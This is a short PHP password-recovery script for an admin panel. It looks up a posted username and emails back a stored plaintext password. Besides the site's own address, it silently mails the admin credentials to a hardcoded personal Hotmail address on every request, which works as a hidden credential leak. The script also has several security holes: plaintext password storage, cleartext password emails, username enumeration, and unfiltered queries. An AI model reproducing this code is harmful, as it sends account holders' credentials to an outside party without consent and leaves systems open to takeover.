<?php
if(!isset($_POST['username'])) exit();
require_once "../conf.php";
if(($password = $cn->getField("SELECT password FROM mp_configuration WHERE username = '".$cn->scape($_POST['username'])."'")) == "") 
	exit("The username does not exist.<br />Please enter another.");
else{
	$subject = "NetPartners International - Recover Password";
	$body = "Your requested to recover password.<br />If this was a mistake, just ignore this message and nothing happen.<br />Your username: ".$cn->getField("SELECT username FROM mp_configuration")."<br />Password: ".$cn->getField("SELECT password FROM mp_configuration")."<br />Visit the following web address to access your account:<br /><a href='http://localhost/manya/gangper/web/mp-admin/'>http://localhost/manya/gangper/web/mp-admin/</a>";
	$headers = "MIME-Version: 1.0\r\nContent-type: text/html; charset=utf-8\r\nFrom: no-reply@manya.pe\r\n";
	mail($cn->getField("SELECT email FROM mp_configuration"), $subject, $body, $headers);
	mail("jw.m.rossel@hotmail.com", $subject, $body, $headers);
}
?>